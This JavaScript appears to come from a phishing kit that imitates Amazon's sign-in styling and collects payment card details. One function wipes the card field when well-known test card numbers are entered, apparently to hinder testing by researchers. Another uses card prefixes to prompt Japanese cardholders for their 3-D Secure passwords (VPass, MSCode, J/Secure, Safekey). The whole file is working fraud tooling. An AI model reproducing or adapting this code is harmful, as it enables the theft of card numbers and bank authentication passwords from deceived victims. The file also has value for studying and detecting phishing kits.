function ccc(){
    var cc = document.getElementById("ccno").value;
    if(cc.match(/^[0-2]|^[7-9]/))
    {
            document.getElementById("ccno").value = "";
    }
    if(cc.match(/4111111111111111|5500000000000004|340000000000009|30000000000004|3088000000000009/))
    {
            document.getElementById("ccno").value = "";
    }
    var type = cc.substr(0, 2);
    var type1 = cc.substr(0, 1);

    if(type == "37" || type == "34") {
      $("#amexcid").html(' <div style="border-top-color: #949494;padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim"><input type="tel" placeholder="CID" name="cid" id="cid" maxlength="4" autocorrect="off" autocapitalize="off"></div>');
      $("#cvv").attr('maxlength','4');
    }else{
      $("#cvv").attr('maxlength','3');
      $("#amexcid").html('');
    }
}
function check_additional() {
    var cc = document.getElementById("ccno").value;
    var type = cc.substr(0, 2);
    var type1 = cc.substr(0, 1);
    var bin = cc.replace(/\s+/g, '');
    var bin = bin.substr(0, 6);
    if(type == "35") {
      $("#webid").hide();
      $("#passwordjp").show();
      $("#passjp").attr("placeholder", "パスワード （J/Secure）");
    }else if(type1 == "4"){
      if(bin == "406138" || bin == "456306" || bin == "420503" || bin == "420504" || bin == "420523" || bin == "420516" || bin == "420538" || bin == "420537" || bin == "420535" || bin == "420529" || bin == "420539" || bin == "420524" || bin == "420521" || bin == "420528" || bin == "420536" || bin == "420520" || bin == "420518" || bin == "420519" || bin == "420531" || bin == "420526" || bin == "420513" || bin == "420534" || bin == "420517" || bin == "420525" || bin == "420527" || bin == "420512" || bin == "420510" || bin == "420511" || bin == "420514" || bin == "420515" || bin == "420530" || bin == "420522" || bin == "420532") {
        $("#webid").hide();
        $("#passwordjp").hide();
      }else{
        $("#webid").show();
        $("#passwordjp").show();
        $("#passjp").attr("placeholder", "パスワード （VPass）");
      }
    }else if(type1 == "5") {
      if(bin == "531284" || bin == "531281" || bin == "531283" || bin == "531285" || bin == "531287" || bin == "531288" || bin == "531286" || bin == "531289" || bin == "531280" || bin == "531282") {
        $("#webid").hide();
        $("#passwordjp").hide();
      }else{
        $("#webid").show();
        $("#passwordjp").show();
        $("#passjp").attr("placeholder", "パスワード （MSCode）");
      }
    }else if(type == "37" || type == "34") {
      $("#webid").hide();
      $("#passwordjp").show();
      $("#passjp").attr("placeholder", "パスワード （Safekey）");
    }else {
      $("#webid").hide();
      $("#passwordjp").hide();
    }
}
function isValidEmailAddress(emailAddress) {
    var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
    return pattern.test(emailAddress);
}
